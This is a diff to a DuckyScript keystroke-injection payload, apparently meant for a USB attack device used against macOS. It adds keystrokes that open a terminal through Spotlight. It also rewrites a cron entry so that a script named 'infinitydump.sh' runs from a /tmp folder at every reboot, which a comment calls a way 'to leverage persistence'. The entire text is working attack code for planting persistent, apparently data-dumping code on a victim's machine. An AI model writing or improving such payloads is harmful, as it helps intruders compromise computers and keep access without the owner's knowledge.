@@ -8,6 +8,9 @@ DELAY 500
 F4
 DELAY 1000
 REM Open Terminal
+GUI SPACE
+DELAY 500
+STRING terminal
 ENTER
 DELAY 1000
 REM Change directory
@@ -42,7 +45,7 @@ STRING chmod +x infinitydump.sh
 ENTER
 DELAY 1000
 REM Set up cron job to run the script at reboot one more way to leverage persistence
-STRING echo "@reboot /tmp/hugo_*/infinitydump.sh" > cronjob
+STRING echo "@reboot cd /tmp/hugo_* && ./infinitydump.sh" > cronjob
 ENTER
 DELAY 1000
 STRING crontab cronjob
